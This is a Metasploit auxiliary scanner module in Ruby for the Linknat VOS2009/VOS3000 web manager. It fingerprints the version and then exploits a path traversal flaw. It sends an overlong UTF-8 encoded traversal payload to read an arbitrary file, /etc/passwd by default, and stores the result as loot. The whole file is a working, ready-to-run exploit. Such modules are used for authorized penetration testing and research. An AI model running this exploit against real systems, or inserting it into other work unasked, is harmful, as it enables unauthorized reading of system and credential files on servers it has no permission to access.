##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Linknat Vos Manager Traversal',
      'Description' => %q(
        This module attempts to test whether a file traversal vulnerability
        is present in version of linknat vos2009/vos3000
      ),
      'References' => [
        ['URL', 'http://www.linknat.com/'],
        ['URL', 'http://www.wooyun.org/bugs/wooyun-2010-0145458']
      ],
      'Author'         => ['Nixawk'],
      'License'        => MSF_LICENSE))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'The path of Linknat Vos Manager (/chs/, /cht/, /eng/)', '/eng/']),
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 5])
      ])
  end

  def vos_uri(path)
    full_uri =~ %r{/$} ? "#{full_uri}#{path}" : "#{full_uri}/#{path}"
  end

  def vos_version
    case target_uri.to_s
    when /chs/i
      js_uri = vos_uri('js/lang_zh_cn.js')
    when /cht/i
      js_uri = vos_uri('js/lang_zh_tw.js')
    when /eng/i
      js_uri = vos_uri('js/lang_en_us.js')
    else
      print_warning("#{full_uri} - Please identify VOS version manually")
      return
    end

    res = send_request_cgi('uri' => js_uri)
    return unless res

    vprint_status("#{js_uri} - HTTP/#{res.proto} #{res.code} #{res.message}")

    return unless res.code == 200
    res.body =~ /s\[8\] = \"([^"]*)\"/m ? major = $1 : major = nil
    res.body =~ /s\[169\] = \"[^:]*: ([^"\\]*)\"/m ? minor = $1 : minor = nil
    "#{major} #{minor}"
  end

  def run_host(ip)
    version = vos_version
    unless version
      print_error("#{full_uri} - Failed to identify Linknat VOS")
      return
    end

    traversal = '/%c0%ae%c0%ae' * datastore['TRAVERSAL_DEPTH']
    filename = datastore['FILEPATH']

    uri = normalize_uri(target_uri.path, '..', traversal, filename)
    res = send_request_cgi(
      'method'  => 'GET',
      'uri'     => uri
    )

    if res && res.code == 200
      path = store_loot(
        version,
        'text/plain',
        ip,
        res.body,
        filename)
      print_good("#{full_uri} - File saved in: #{path}")
    else
      print_error("#{full_uri} - Nothing was downloaded")
    end
  end
end
